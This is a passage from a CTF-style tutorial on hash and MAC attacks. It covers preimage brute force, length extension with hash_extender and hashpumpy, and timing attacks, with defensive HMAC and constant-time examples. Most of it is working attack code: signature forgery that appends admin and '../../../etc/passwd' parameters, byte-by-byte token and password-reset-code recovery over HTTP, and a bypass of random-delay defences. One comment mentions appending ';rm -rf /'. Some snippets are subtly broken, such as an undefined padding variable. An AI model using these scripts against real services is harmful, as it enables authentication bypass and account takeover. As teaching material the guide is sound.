        outputs.append(h[:2])  # First 2 bytes
    
    # Chi-square test
    counts = collections.Counter(outputs)
    expected = samples / 256  # For 2 bytes
    
    chi_square = sum((count - expected)**2 / expected 
                     for count in counts.values())
    
    # Chi-square critical value for α=0.05, df=255
    critical_value = 293.25
    
    if chi_square > critical_value:
        return "NON-UNIFORM - Potential weakness"
    return "UNIFORM - Likely secure"

# Test
import hashlib
result = statistical_test(lambda x: hashlib.sha256(x).digest())
print(result)
```

**Practical CTF Scenarios**:

**Scenario 1: Format String Hash**:

```python
# Challenge provides hash of formatted string
# Find input producing target hash

def format_string_preimage(template, target_hash):
    """
    Template: "user_{}_score_{}"
    Find values producing target hash
    """
    import hashlib
    import itertools
    
    for user_id in range(1000):
        for score in range(1000):
            data = template.format(user_id, score).encode()
            if hashlib.md5(data).hexdigest() == target_hash:
                return user_id, score
    
    return None, None

# Usage
user, score = format_string_preimage("user_{}_score_{}", "target_hash_here")
```

**Scenario 2: Constrained Input Space**:

```bash
# Input limited to specific format (dates, IDs, etc.)
# Exhaustive search becomes feasible

python3 << 'EOF'
import hashlib
from datetime import datetime, timedelta

def date_preimage(target_hash, start_year=2020, end_year=2025):
    """
    Find date producing target hash
    Format: YYYY-MM-DD
    """
    start_date = datetime(start_year, 1, 1)
    end_date = datetime(end_year, 12, 31)
    current = start_date
    
    while current <= end_date:
        date_str = current.strftime("%Y-%m-%d").encode()
        if hashlib.sha256(date_str).hexdigest() == target_hash:
            return date_str
        current += timedelta(days=1)
    
    return None

# Search ~5 years of dates (~1825 attempts)
result = date_preimage("target_hash", 2020, 2025)
EOF
```

**GPU-Accelerated Preimage**:

```bash
# Use hashcat for partial preimage
# [Inference] Not direct preimage but can find matching prefixes

# Generate candidates matching hash prefix
hashcat -m 0 -a 3 --hex-charset \
  -1 00010203040506 \
  --outfile-format=2 \
  --outfile=matches.txt \
  "deadbeef????????????????????????????????" \
  ?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1

# This finds inputs where MD5 starts with "deadbeef"
```

**Defense and Detection**:

```python
def is_preimage_vulnerable(hash_algorithm, output_bits):
    """
    Assess preimage resistance
    """
    vulnerabilities = []
    
    # Truncation
    if output_bits < 128:
        vulnerabilities.append(
            f"WEAK: {output_bits}-bit output allows brute force"
        )
    
    # Known broken algorithms
    broken = ['md4', 'md5-weak', 'sha1-reduced']
    if hash_algorithm.lower() in broken:
        vulnerabilities.append(
            f"BROKEN: {hash_algorithm} has known weaknesses"
        )
    
    # Custom/unknown
    if hash_algorithm not in ['md5', 'sha1', 'sha256', 'sha512', 'sha3']:
        vulnerabilities.append(
            "UNKNOWN: Custom hash - manual analysis required"
        )
    
    return vulnerabilities if vulnerabilities else ["SECURE: No obvious weaknesses"]

# Check challenge hash
print(is_preimage_vulnerable('md5', 128))
print(is_preimage_vulnerable('custom', 32))
```

**Complexity Summary** [Inference]:

```
Hash Type        | Output Bits | Preimage Complexity | Practical?
-----------------|-------------|---------------------|------------
Truncated (32)   | 32          | 2^32 (~4B)         | Yes (GPU)
Truncated (64)   | 64          | 2^64               | Borderline
MD5 (full)       | 128         | 2^128              | No
SHA-1 (full)     | 160         | 2^160              | No
SHA-256 (full)   | 256         | 2^256              | No
Custom weak      | Variable    | Depends on design   | Often yes
```

### Length Extension Attacks

Length extension attacks exploit the Merkle-Damgård construction used in MD5, SHA-1, and SHA-2 family hashes. Given H(secret||data) without knowing the secret, an attacker can compute H(secret||data||padding||append) and forge valid signatures or authentication tokens.

**Vulnerable Hash Functions**:

- MD5
- SHA-1
- SHA-224, SHA-256
- SHA-384, SHA-512

**NOT Vulnerable**:

- SHA-3 (different construction)
- BLAKE2
- HMAC (proper keyed construction)

**Attack Mechanism**:

```
Given: H(secret || known_data)
Compute: H(secret || known_data || padding || malicious_data)

Without knowing secret!
```

**Core Concept**: Merkle-Damgård hashes process data in blocks, maintaining internal state. The final state becomes the hash output. Since we know the hash = final state, we can continue hashing from that state.

**Kali Linux Tools**:

```bash
# hash_extender (primary tool)
git clone https://github.com/iagox86/hash_extender.git
cd hash_extender
make
sudo make install

# Basic usage
hash_extender \
  --data "original_data" \
  --secret 16 \
  --append "malicious_data" \
  --signature "6036708eba0d11f6ef52ad44e8b74d5b" \
  --format md5

# Output:
# New signature: <extended_hash>
# New string: <original||padding||malicious>

# Parameters:
# --data: Known data
# --secret: Length of unknown secret (bytes)
# --append: Data to add
# --signature: Original hash
# --format: md5, sha1, sha256, sha512
```

**Manual Implementation**:

```python
import hashlib
import struct

def md5_length_extend(original_hash, known_data, secret_length, append_data):
    """
    Perform MD5 length extension attack
    """
    # Convert hash to state
    h = [int(original_hash[i:i+8], 16) for i in range(0, 32, 8)]
    
    # Calculate padding for original message
    original_length = secret_length + len(known_data)
    padding = b'\x80'  # Bit 1 followed by zeros
    
    # Pad to 64-byte block boundary (minus 8 for length)
    pad_length = (55 - original_length) % 64
    padding += b'\x00' * pad_length
    
    # Append original bit length
    padding += struct.pack('<Q', original_length * 8)
    
    # Construct new message (from attacker's perspective)
    forged_message = known_data + padding + append_data
    
    # Continue hashing from known state
    # [Inference] This requires MD5 internals implementation
    # Use hashlib with custom state (not directly supported)
    # hash_extender tool handles this complexity
    
    return forged_message, padding

# Practical usage - use hash_extender tool instead
```

**Python HashPump (Alternative Tool)**:

```bash
# Install hashpumpy
pip3 install hashpumpy

python3 << 'EOF'
import hashpumpy

# Known hash and data
original_hash = "6036708eba0d11f6ef52ad44e8b74d5b"
original_data = "count=1"
secret_length = 16
append = "&admin=true"

# Perform extension
new_hash, forged_data = hashpumpy.hashpump(
    original_hash,
    original_data,
    append,
    secret_length
)

print(f"Original: {original_data}")
print(f"Forged: {forged_data}")
print(f"New signature: {new_hash}")
EOF
```

**CTF Exploitation Scenarios**:

**Scenario 1: Cookie Forgery**:

```bash
# Web app signs cookies: signature = MD5(secret || cookie_data)
# Cookie: "user=guest&role=user"
# Signature: "abc123def456..."

# Goal: Create cookie with "&admin=true" appended

# Attack
hash_extender \
  --data "user=guest&role=user" \
  --secret 32 \
  --append "&admin=true" \
  --signature "abc123def456..." \
  --format md5 \
  --out-data-format html

# Result: New cookie with padding + &admin=true
# New signature validates!

# URL encode the output for web submission
python3 -c "import urllib.parse; print(urllib.parse.quote(b'...'))"
```

**Scenario 2: API Token Manipulation**:

```python
# API signs requests: sig = SHA256(api_secret || request_data)
import hashpumpy

# Intercepted request
original_request = b"GET /api/files?limit=10"
original_sig = "deadbeef..."
secret_len = 64  # Guessed or brute-forced

# Extend to access restricted files
malicious_append = b"&path=../../../etc/passwd"

new_sig, forged_request = hashpumpy.hashpump(
    original_sig,
    original_request,
    malicious_append,
    secret_len
)

print(f"Forged request: {forged_request}")
print(f"Valid signature: {new_sig}")
```

**Scenario 3: Authentication Bypass**:

```bash
# Challenge: Server validates commands with MAC
# MAC = MD5(secret_key || command)

# Known valid command: "status"
# Known MAC: "5f4dcc3b5aa765d61d8327deb882cf99"

# Forge command with ";rm -rf /" appended
hash_extender \
  --data "status" \
  --secret 20 \
  --append ";cat flag.txt" \
  --signature "5f4dcc3b5aa765d61d8327deb882cf99" \
  --format md5

# Submit forged command + new MAC
```

**Secret Length Discovery**:

```bash
# If secret length unknown, brute force it
for length in {1..64}; do
    echo "Trying secret length: $length"
    
    result=$(hash_extender \
      --data "known_data" \
      --secret $length \
      --append "test" \
      --signature "original_hash" \
      --format sha256 \
      --quiet)
    
    # Test against server
    # If validation succeeds, correct length found
done
```

**Padding Calculation**:

```python
def calculate_md5_padding(secret_length, known_data_length):
    """
    Calculate padding bytes for length extension
    Important for understanding forged message structure
    """
    import struct
    
    total_length = secret_length + known_data_length
    
    # MD5 padding: 0x80, then zeros, then 8-byte length
    padding = b'\x80'
    
    # Pad to 56 bytes (mod 64)
    pad_length = (55 - total_length) % 64
    padding += b'\x00' * pad_length
    
    # Append bit length (little-endian)
    bit_length = total_length * 8
    padding += struct.pack('<Q', bit_length)
    
    return padding

# Example
secret_len = 16
data_len = len(b"user=guest")
padding = calculate_md5_padding(secret_len, data_len)
print(f"Padding bytes: {padding.hex()}")
print(f"Padding length: {len(padding)}")
```

**SHA-256 Extension**:

```bash
# SHA-256 uses same Merkle-Damgård construction
hash_extender \
  --data "original_message" \
  --secret 32 \
  --append "malicious_payload" \
  --signature "sha256_hash_here" \
  --format sha256 \
  --out-data-format hex

# Note: SHA-3 is NOT vulnerable (different construction)
```

**SHA-512 Extension**:

```bash
# SHA-512 has different block size (128 bytes vs 64)
# padding calculation differs

hash_extender \
  --data "data" \
  --secret 64 \
  --append "append" \
  --signature "sha512_hash" \
  --format sha512
```

**Multi-Stage Extension**:

```python
# Extend multiple times
import hashpumpy

# Stage 1: Extend once
hash1, data1 = hashpumpy.hashpump(
    "original_hash",
    "original_data",
    "append1",
    16  # secret length
)

# Stage 2: Extend again (treat previous as new "original")
# Note: Secret length now includes previous padding!
new_secret_len = 16 + len("original_data") + len(padding_from_stage1)

hash2, data2 = hashpumpy.hashpump(
    hash1,
    data1[16:],  # Exclude original secret position
    "append2",
    new_secret_len
)

print(f"Double-extended: {data2}")
```

**Defense Detection**:

```python
def is_length_extension_vulnerable(auth_scheme):
    """
    Identify vulnerable authentication patterns
    """
    vulnerable_patterns = [
        "MD5(secret||data)",
        "SHA1(secret||data)",
        "SHA256(secret||data)",
        "hash(key+message)",  # Prefix construction
    ]
    
    secure_patterns = [
        "HMAC-SHA256",
        "HMAC-MD5",  # HMAC even with weak hash resists extension
        "SHA3(secret||data)",  # SHA-3 not vulnerable
        "hash(message||key)",  # Suffix construction resists (but weak)
    ]
    
    # Check scheme
    if any(pattern in auth_scheme for pattern in vulnerable_patterns):
        return "VULNERABLE to length extension"
    elif any(pattern in auth_scheme for pattern in secure_patterns):
        return "RESISTANT to length extension"
    else:
        return "UNKNOWN - manual analysis required"

# Test
print(is_length_extension_vulnerable("MD5(secret||data)"))
print(is_length_extension_vulnerable("HMAC-SHA256(secret, data)"))
```

**HMAC Comparison** (Proper Construction):

```python
import hmac
import hashlib

# VULNERABLE: Manual prefix
def vulnerable_mac(secret, data):
    """DO NOT USE"""
    return hashlib.md5(secret + data).hexdigest()

# SECURE: HMAC
def secure_mac(secret, data):
    """Use this instead"""
    return hmac.new(secret, data, hashlib.md5).hexdigest()

# HMAC prevents length extension through nested hashing:
# HMAC(K, m) = H((K ⊕ opad) || H((K ⊕ ipad) || m))
```

**Automated Testing Script**:

```bash
#!/bin/bash
# test_length_extension.sh

TARGET_URL="http://challenge.ctf/api"
KNOWN_DATA="action=view&file=public.txt"
KNOWN_SIG="abc123def456"
APPEND="&file=../flag.txt"

# Try different secret lengths
for SECRET_LEN in {8..64}; do
    echo "[*] Testing secret length: $SECRET_LEN"
    
    # Generate extended signature
    RESULT=$(hash_extender \
        --data "$KNOWN_DATA" \
        --secret $SECRET_LEN \
        --append "$APPEND" \
        --signature "$KNOWN_SIG" \
        --format md5 \
        --quiet)
    
    NEW_DATA=$(echo "$RESULT" | grep "New string" | cut -d: -f2)
    NEW_SIG=$(echo "$RESULT" | grep "New signature" | cut -d: -f2)
    
    # Test against server
    RESPONSE=$(curl -s "$TARGET_URL" \
        -d "data=$NEW_DATA" \
        -d "signature=$NEW_SIG")
    
    if echo "$RESPONSE" | grep -q "flag{"; then
        echo "[+] SUCCESS! Secret length: $SECRET_LEN"
        echo "$RESPONSE"
        exit 0
    fi
done

echo "[-] Failed to find correct secret length"
```

**Padding Verification**:

```python
def verify_padding_structure(forged_data, original_data, secret_length):
    """
    Verify padding is correctly formed
    """
    # Expected structure: original || padding || appended
    expected_pad_start = len(original_data)
    
    # Check for 0x80 byte
    if forged_data[expected_pad_start] != 0x80:
        return False, "Missing 0x80 marker"
    
    # Check padding zeros
    # Last 8 bytes should be length
    # Everything between should be 0x00
    
    return True, "Padding correct"
```

**Common Pitfalls**:

```
1. Wrong secret length
   - Brute force 1-64 if unknown
   - Server may reveal through timing/errors

2. Incorrect format parameter
   - Match server's hash algorithm exactly
   - MD5 vs SHA-1 vs SHA-256

3. URL encoding issues
   - Padding contains null bytes and control chars
   - Must properly encode for HTTP transmission

4. Appending to wrong position
   - Ensure appending after padding, not in middle

5. Hash format confusion
   - Hex vs raw bytes
   - Big-endian vs little-endian (SHA-256 vs MD5)
```

**Success Indicators** [Inference]:

- Server accepts forged signature
- Modified behavior (elevated privileges, file access)
- Different response than with invalid signature
- Error messages change (from "invalid sig" to "access denied")

### Timing Attacks

Timing attacks exploit variations in computation time to leak information about secret data, most commonly targeting cryptographic comparisons, password verification, and hash computations. These side-channel attacks measure execution time differences measured in microseconds to milliseconds.

**Attack Principles**:

Vulnerable comparison:

```python
# VULNERABLE: Early-exit comparison
def vulnerable_compare(hash1, hash2):
    """DO NOT USE - timing leak"""
    if len(hash1) != len(hash2):
        return False
    
    for i in range(len(hash1)):
        if hash1[i] != hash2[i]:
            return False  # Early exit reveals position
    
    return True
```

Secure comparison:

```python
# SECURE: Constant-time comparison
def secure_compare(hash1, hash2):
    """Use this instead"""
    if len(hash1) != len(hash2):
        return False
    
    result = 0
    for a, b in zip(hash1, hash2):
        result |= a ^ b  # Always processes all bytes
    
    return result == 0
```

**Kali Linux Tools**:

```bash
# Custom timing measurement scripts
# Python with high-resolution timing

# cURL with timing
curl -w "@curl-timing.txt" -o /dev/null -s "http://target/api"

# curl-timing.txt format:
cat > curl-timing.txt << 'EOF'
time_namelookup:  %{time_namelookup}\n
time_connect:  %{time_connect}\n
time_starttransfer:  %{time_starttransfer}\n
time_total:  %{time_total}\n
EOF

# Apache Bench for statistical timing
ab -n 1000 -c 1 "http://target/verify?token=test"

# Custom Python timing harness
python3 timing_attack.py
```

**Basic Timing Attack Implementation**:

```python
import requests
import time
import statistics

def measure_timing(url, token, iterations=100):
    """
    Measure average response time for token validation
    """
    times = []
    
    for _ in range(iterations):
        start = time.perf_counter()
        response = requests.get(f"{url}?token={token}")
        end = time.perf_counter()
        
        times.append(end - start)
    
    # Remove outliers
    times_sorted = sorted(times)
    trimmed = times_sorted[10:-10]  # Remove top/bottom 10
    
    return {
        'mean': statistics.mean(trimmed),
        'median': statistics.median(trimmed),
        'stdev': statistics.stdev(trimmed)
    }

# Usage
url = "http://target.ctf/verify"
result = measure_timing(url, "test_token_00000000", iterations=200)
print(f"Mean: {result['mean']*1000:.2f}ms")
```

**Character-by-Character Hash Extraction**:

```python
def timing_attack_hash(base_url, hash_length=32):
    """
    Exploit timing leak to extract hash byte-by-byte
    Assumes vulnerable comparison that exits early on mismatch
    """
    import requests
    import time
    import string
    
    known_hash = ""
    charset = string.hexdigits.lower()[:16]  # 0-9,a-f for hex
    
    for position in range(hash_length):
        print(f"[*] Attacking position {position}...")
        
        best_char = None
        max_time = 0
        
        # Test each possible character
        for char in charset:
            test_hash = known_hash + char + "0" * (hash_length - position - 1)
            
            # Measure timing
            times = []
            for _ in range(50):  # Multiple measurements for accuracy
                start = time.perf_counter()
                requests.get(f"{base_url}?hash={test_hash}", timeout=5)
                end = time.perf_counter()
                times.append(end - start)
            
            avg_time = sum(times) / len(times)
            
            # Longer time = more characters matched before rejection
            if avg_time > max_time:
                max_time = avg_time
                best_char = char
        
        known_hash += best_char
        print(f"[+] Found: {known_hash}")
    
    return known_hash

# Example usage
# recovered = timing_attack_hash("http://target/verify", 32)
```

**Statistical Analysis Approach**:

```python
import numpy as np
from scipy import stats

def statistical_timing_attack(url, candidates, samples=100):
    """
    Use statistical tests to identify correct value
    More robust than simple max-time approach
    """
    results = {}
    
    for candidate in candidates:
        times = []
        
        for _ in range(samples):
            start = time.perf_counter()
            requests.get(f"{url}?token={candidate}")
            end = time.perf_counter()
            times.append((end - start) * 1000)  # Convert to ms
        
        results[candidate] = {
            'times': times,
            'mean': np.mean(times),
            'std': np.std(times)
        }
    
    # Find outlier (significantly different timing)
    means = [r['mean'] for r in results.values()]
    
    for candidate, data in results.items():
        # Z-score test
        z_score = (data['mean'] - np.mean(means)) / np.std(means)
        
        if abs(z_score) > 2:  # 2 standard deviations
            print(f"[+] Candidate {candidate} shows timing anomaly")
            print(f"    Mean: {data['mean']:.3f}ms, Z-score: {z_score:.2f}")
    
    return results

# Usage
candidates = ["token1", "token2", "correct_token", "token4"]
results = statistical_timing_attack("http://target/api", candidates, samples=200)
```

**Remote Timing Attack (Network Jitter Handling)**:

```python
def remote_timing_attack_robust(url, hash_param="hash"):
    """
    Timing attack resilient to network jitter
    Uses differential timing between candidates
    """
    import requests
    import time
    
    def measure_batch(test_values, iterations=50):
        """Measure multiple values in quick succession"""
        measurements = {val: [] for val in test_values}
        
        for _ in range(iterations):
            # Randomize order to avoid systematic bias
            import random
            order = list(test_values)
            random.shuffle(order)
            
            for val in order:
                start = time.perf_counter()
                try:
                    requests.get(f"{url}?{hash_param}={val}", timeout=2)
                except:
                    pass
                end = time.perf_counter()
                
                measurements[val].append((end - start) * 1000000)  # microseconds
        
        # Calculate relative timings
        return {val: np.median(times) for val, times in measurements.items()}
    
    # Attack implementation
    known = ""
    charset = "0123456789abcdef"
    hash_length = 32

    for pos in range(hash_length):
        candidates = [known + c + "0" * (hash_length - pos - 1) for c in charset]
        
        # Measure in batches to reduce network variance
        timings = measure_batch(candidates, iterations=100)
        
        # Find candidate with longest time (most chars matched)
        best_candidate = max(timings.items(), key=lambda x: x[1])
        best_char = best_candidate[0][pos]
        
        known += best_char
        print(f"[+] Position {pos}: {best_char} (time: {best_candidate[1]:.2f}μs)")
    
    return known

# Usage with network timing
# recovered_hash = remote_timing_attack_robust("http://remote.ctf/verify")
```

**Local Timing Attack (Higher Precision)**:

```python
def local_timing_attack(compare_function, target_hash, charset="0123456789abcdef"):
    """
    Exploit timing leak in local function
    Higher precision than network-based
    """
    import time
    
    known = ""
    
    for position in range(len(target_hash)):
        best_char = None
        max_time = 0
        
        for char in charset:
            test_hash = known + char + "0" * (len(target_hash) - position - 1)
            
            # Many iterations for precision
            total_time = 0
            iterations = 10000
            
            for _ in range(iterations):
                start = time.perf_counter_ns()  # Nanosecond precision
                compare_function(target_hash, test_hash)
                end = time.perf_counter_ns()
                total_time += (end - start)
            
            avg_time = total_time / iterations
            
            if avg_time > max_time:
                max_time = avg_time
                best_char = char
        
        known += best_char
        print(f"[+] Found: {known} (avg time: {max_time}ns)")
    
    return known

# Example vulnerable function
def vulnerable_hmac_compare(expected, provided):
    """Example of timing-vulnerable comparison"""
    if len(expected) != len(provided):
        return False
    for i in range(len(expected)):
        if expected[i] != provided[i]:
            return False
    return True

# Attack
# recovered = local_timing_attack(vulnerable_hmac_compare, "deadbeef1234...")
```

**Timing Attack on HMAC Validation**:

```python
def timing_attack_hmac_api(base_url, known_message):
    """
    Attack HMAC verification endpoint
    Common CTF pattern: verify=HMAC(key, message)
    """
    import requests
    import time
    import itertools
    
    # HMAC output length (hex-encoded)
    # SHA256: 64 chars, SHA1: 40 chars, MD5: 32 chars
    hmac_length = 64  # Assume SHA256
    
    known_hmac = ""
    charset = "0123456789abcdef"
    
    for position in range(hmac_length):
        print(f"[*] Position {position}/{hmac_length}")
        
        timings = {}
        
        for char in charset:
            candidate = known_hmac + char + "0" * (hmac_length - position - 1)
            
            # Multiple measurements
            samples = []
            for _ in range(30):
                start = time.perf_counter()
                try:
                    resp = requests.post(
                        f"{base_url}/verify",
                        json={
                            "message": known_message,
                            "signature": candidate
                        },
                        timeout=5
                    )
                except:
                    continue
                
                end = time.perf_counter()
                samples.append((end - start) * 1000)
            
            if samples:
                # Use median to reduce outlier impact
                timings[char] = sorted(samples)[len(samples)//2]
        
        # Select character with longest timing
        if timings:
            best_char = max(timings.items(), key=lambda x: x[1])[0]
            known_hmac += best_char
            print(f"    Found: {best_char} (time: {timings[best_char]:.3f}ms)")
        else:
            print(f"    Warning: No valid timings for position {position}")
            break
    
    return known_hmac

# Usage
# signature = timing_attack_hmac_api("http://api.ctf", "message=hello")
```

**Timing Attack with Noise Reduction**:

```python
def timing_attack_with_filtering(url_template, hash_length=32):
    """
    Advanced timing attack with outlier removal and multiple rounds
    """
    import requests
    import time
    import numpy as np
    from collections import Counter
    
    def measure_with_outlier_removal(url, iterations=100):
        """Measure timing with statistical outlier removal"""
        times = []
        
        for _ in range(iterations):
            start = time.perf_counter()
            try:
                requests.get(url, timeout=3)
            except:
                continue
            end = time.perf_counter()
            times.append((end - start) * 1000000)  # microseconds
        
        if not times:
            return 0
        
        # Remove outliers using IQR method
        q1 = np.percentile(times, 25)
        q3 = np.percentile(times, 75)
        iqr = q3 - q1
        
        filtered = [t for t in times if q1 - 1.5*iqr <= t <= q3 + 1.5*iqr]
        
        return np.mean(filtered) if filtered else np.mean(times)
    
    known = ""
    charset = "0123456789abcdef"
    
    for position in range(hash_length):
        # Run multiple rounds and vote
        votes = Counter()
        
        for round_num in range(3):  # 3 independent rounds
            print(f"[*] Position {position}, Round {round_num+1}/3")
            
            timings = {}
            for char in charset:
                test_hash = known + char + "0" * (hash_length - position - 1)
                url = url_template.format(hash=test_hash)
                
                timing = measure_with_outlier_removal(url, iterations=50)
                timings[char] = timing
            
            # Vote for char with longest time
            best_char = max(timings.items(), key=lambda x: x[1])[0]
            votes[best_char] += 1
        
        # Select most-voted character
        winner = votes.most_common(1)[0][0]
        known += winner
        print(f"[+] Position {position}: {winner} (votes: {votes[winner]}/3)")
    
    return known

# Usage
# recovered = timing_attack_with_filtering("http://target/check?hash={hash}")
```

**Parallel Timing Attack**:

```bash
# GNU Parallel for distributed timing measurements
cat candidates.txt | parallel -j 10 "
    echo -n '{} '
    curl -w '%{time_total}' -o /dev/null -s 'http://target/verify?token={}'
    echo
" | sort -k2 -rn | head -1

# Python parallel version
python3 << 'EOF'
from concurrent.futures import ThreadPoolExecutor
import requests
import time

def time_request(token):
    start = time.perf_counter()
    try:
        requests.get(f"http://target/verify?token={token}", timeout=5)
    except:
        pass
    end = time.perf_counter()
    return token, (end - start) * 1000

# Measure 100 candidates in parallel
candidates = [f"token_{i:04d}" for i in range(100)]

with ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(time_request, candidates))

# Find slowest (likely correct due to more chars matched)
slowest = max(results, key=lambda x: x[1])
print(f"Likely correct: {slowest[0]} ({slowest[1]:.3f}ms)")
EOF
```

**CTF-Specific Patterns**:

**Pattern 1: Token Validation**:

```python
def attack_token_validation(base_url):
    """
    Common CTF: Admin token validation via timing
    Server: if token == ADMIN_TOKEN: grant_access()
    """
    import string
    
    # Try common prefixes first
    common_prefixes = ["admin_", "token_", "secret_", "flag_"]
    
    for prefix in common_prefixes:
        print(f"[*] Trying prefix: {prefix}")
        
        known = prefix
        charset = string.ascii_letters + string.digits + "_-"
        
        while True:
            best_char = None
            max_time = 0
            
            for char in charset:
                test_token = known + char
                
                times = []
                for _ in range(30):
                    start = time.perf_counter()
                    resp = requests.get(f"{base_url}?token={test_token}")
                    end = time.perf_counter()
                    times.append(end - start)
                
                avg = sum(times) / len(times)
                
                if avg > max_time:
                    max_time = avg
                    best_char = char
            
            # Check if we found valid ending
            test_complete = known + best_char
            resp = requests.get(f"{base_url}?token={test_complete}")
            
            if resp.status_code == 200 or "admin" in resp.text.lower():
                print(f"[+] Found token: {test_complete}")
                return test_complete
            
            known += best_char
            print(f"    Current: {known}")
            
            # Arbitrary length limit
            if len(known) > 50:
                break

# Usage
# admin_token = attack_token_validation("http://challenge.ctf/admin")
```

**Pattern 2: Password Reset Code**:

```python
def timing_attack_reset_code(base_url, email):
    """
    Attack password reset code validation
    Codes often 6-digit numeric
    """
    import requests
    import time
    
    known = ""
    
    for position in range(6):  # 6-digit code
        best_digit = None
        max_time = 0
        
        for digit in "0123456789":
            test_code = known + digit + "0" * (5 - position)
            
            times = []
            for _ in range(50):
                start = time.perf_counter()
                resp = requests.post(
                    f"{base_url}/reset",
                    data={"email": email, "code": test_code}
                )
                end = time.perf_counter()
                times.append(end - start)
            
            avg_time = sum(times) / len(times)
            
            if avg_time > max_time:
                max_time = avg_time
                best_digit = digit
        
        known += best_digit
        print(f"[+] Reset code so far: {known}")
    
    return known

# Usage
# code = timing_attack_reset_code("http://target.ctf", "victim@example.com")
```

**Timing Attack Detection Script**:

```python
def detect_timing_vulnerability(url, test_values):
    """
    Analyze if endpoint is vulnerable to timing attacks
    """
    import requests
    import time
    import numpy as np
    
    print("[*] Testing for timing vulnerabilities...")
    
    measurements = {}
    
    for value in test_values:
        times = []
        
        for _ in range(100):
            start = time.perf_counter()
            try:
                requests.get(f"{url}?param={value}", timeout=5)
            except:
                continue
            end = time.perf_counter()
            times.append((end - start) * 1000)
        
        measurements[value] = {
            'mean': np.mean(times),
            'std': np.std(times),
            'times': times
        }
    
    # Statistical analysis
    means = [m['mean'] for m in measurements.values()]
    overall_std = np.std(means)
    
    print(f"\n[*] Analysis Results:")
    print(f"    Mean response time: {np.mean(means):.3f}ms")
    print(f"    Std dev between values: {overall_std:.3f}ms")
    
    # Check for significant differences
    if overall_std > 5:  # > 5ms difference
        print("[!] VULNERABLE: Significant timing differences detected")
        print("    Values with anomalous timing:")
        
        for val, data in measurements.items():
            z_score = (data['mean'] - np.mean(means)) / np.std(means)
            if abs(z_score) > 1.5:
                print(f"      {val}: {data['mean']:.3f}ms (z-score: {z_score:.2f})")
        
        return True
    else:
        print("[+] SECURE: No significant timing differences")
        return False

# Test
test_values = [
    "wrong_value_1",
    "wrong_value_2",
    "correct_value",  # Should take longer if vulnerable
    "wrong_value_3"
]

# vulnerable = detect_timing_vulnerability("http://target/api", test_values)
```

**Defense Bypass Techniques**:

```python
def bypass_random_delay(url, hash_param, iterations=200):
    """
    Some servers add random delay to prevent timing attacks
    Use large sample sizes and statistical methods
    """
    import requests
    import time
    import numpy as np
    
    def measure_stable_timing(value, samples=200):
        """Use median of large sample to reduce random delay impact"""
        times = []
        
        for _ in range(samples):
            start = time.perf_counter()
            requests.get(f"{url}?{hash_param}={value}")
            end = time.perf_counter()
            times.append(end - start)
        
        # Median is more robust against artificial delays
        return np.median(times)
    
    # Attack proceeds with larger sample sizes
    known = ""
    charset = "0123456789abcdef"
    
    for position in range(32):
        timings = []
        
        for char in charset:
            test = known + char + "0" * (31 - position)
            timing = measure_stable_timing(test, samples=iterations)
            timings.append((char, timing))
            print(f"    {char}: {timing*1000:.3f}ms")
        
        # Select char with longest median timing
        best = max(timings, key=lambda x: x[1])
        known += best[0]
        print(f"[+] Position {position}: {best[0]}")
    
    return known

# Usage against defended endpoint
# recovered = bypass_random_delay("http://hardened.ctf/verify", "hash", iterations=300)
```

**Constant-Time Implementation (Defense)**:

```python
def constant_time_compare(a, b):
    """
    Proper constant-time comparison
    Use this in your own implementations
    """
    if len(a) != len(b):
        return False
    
    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)
    
    return result == 0

# Python 3.3+ has hmac.compare_digest
import hmac

def secure_token_check(provided_token, expected_token):
    """Use stdlib constant-time comparison"""
    return hmac.compare_digest(provided_token, expected_token)

# Timing test
import time

def test_constant_time(compare_func):
    """Verify function is actually constant-time"""
    correct = "a" * 32
    
    # Test early mismatch
    early_wrong = "b" + "a" * 31
    
    # Test late mismatch  
    late_wrong = "a" * 31 + "b"
    
    iterations = 10000
    
    # Time early mismatch
    start = time.perf_counter()
    for _ in range(iterations):
        compare_func(correct, early_wrong)
    early_time = time.perf_counter() - start
    
    # Time late mismatch
    start = time.perf_counter()
    for _ in range(iterations):
        compare_func(correct, late_wrong)
    late_time = time.perf_counter() - start
    
    diff_percent = abs(early_time - late_time) / early_time * 100
    
    print(f"Early mismatch: {early_time*1000:.3f}ms")
    print(f"Late mismatch: {late_time*1000:.3f}ms")
    print(f"Difference: {diff_percent:.2f}%")
    
    if diff_percent < 5:
        print("[+] Appears constant-time")
    else:
        print("[!] Timing leak detected")

# Test implementations
test_constant_time(constant_time_compare)
test_constant_time(lambda a,b: a == b)  # Vulnerable
```

**Practical Considerations** [Inference]:

```
Local Attack:
- Precision: nanoseconds
- Sample size: 1,000-10,000
- Success rate: High if vulnerable

Remote Attack (LAN):
- Precision: microseconds  
- Sample size: 50-200 per char
- Success rate: Medium-High
- Network jitter: ~100μs

Remote Attack (Internet):
- Precision: milliseconds
- Sample size: 200-500 per char
- Success rate: Low-Medium
- Network jitter: ~10-50ms
- Requires significant timing difference (>5ms per char)

Defense Effectiveness:
- Random delay (1-10ms): Defeated by large samples
- Constant-time comparison: Effective defense
- Rate limiting: Prevents attack (but breaks legitimate use)
- HMAC (proper): Immune to timing on comparison
```

**Tool Summary**:

- **cURL**: Basic timing measurements
- **Apache Bench**: Statistical timing analysis
- **Custom Python**: Most flexible for CTF scenarios
- **Burp Intruder**: Can measure timing in web requests
- **timing_attack.py**: Purpose-built scripts (create custom)

**Important Notes**:

- [Inference] Modern servers often add random delays specifically to prevent timing attacks
- HMAC with proper comparison (`hmac.compare_digest`) is the recommended defense
- Network timing attacks require significant timing differences (milliseconds, not microseconds)
- Local timing attacks are much more precise and practical

---

## Message Authentication Codes (MAC)

Message Authentication Codes provide integrity and authenticity verification by computing a cryptographic tag over message and secret key. Unlike digital signatures, MACs use symmetric keys shared between parties. CTF challenges exploit weak key derivation, nonce reuse, truncation vulnerabilities, and implementation flaws in MAC verification.

---

### HMAC (Hash-based MAC)

HMAC combines cryptographic hash functions with secret keys using nested padding operations. Designed by Bellare, Canetti, and Krawczyk, HMAC provides provable security under minimal assumptions about underlying hash.

#### HMAC Construction

**Algorithm:**

```
HMAC(K, M) = H((K ⊕ opad) || H((K ⊕ ipad) || M))

Where:
- K: secret key (padded to hash block size if necessary)
- ipad: inner padding (0x36 repeated)
- opad: outer padding (0x5c repeated)
- H: hash function (MD5, SHA-256, SHA-512, etc.)
- ||: concatenation
- ⊕: XOR
```

**Key Expansion:**

```
If |K| > block_size:
